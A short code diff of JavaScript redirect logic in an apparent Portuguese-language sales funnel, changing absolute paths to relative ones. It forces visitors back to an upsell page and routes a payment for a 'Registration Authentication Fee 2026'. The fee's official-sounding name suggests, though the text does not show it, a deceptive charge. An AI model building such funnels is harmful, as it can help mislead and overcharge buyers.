@@ -442,7 +442,7 @@
     (function() {
       var p = new URLSearchParams(window.location.search);
       if (!p.get('funil_ok')) {
-        var back = new URL('/upsell1/', window.location.origin);
+        var back = new URL('../../upsell/1/', window.location.href);
         p.forEach(function(v, k) { back.searchParams.set(k, v); });
         window.location.replace(back.toString());
         return;
@@ -519,8 +519,10 @@
       params.set('valor', '3840');
       params.set('product_name', 'Taxa de Autenticação Cadastral 2026');
       params.set('funil_ok', '1');
-      params.set('next', '/upsell/3/');
-      window.location.href = '/pagamento/?' + params.toString();
+      params.set('next', '../upsell/3/');
+      var target = new URL('../../pagamento/', window.location.href);
+      params.forEach(function(v, k) { target.searchParams.set(k, v); });
+      window.location.href = target.toString();
     });
 
     // Init
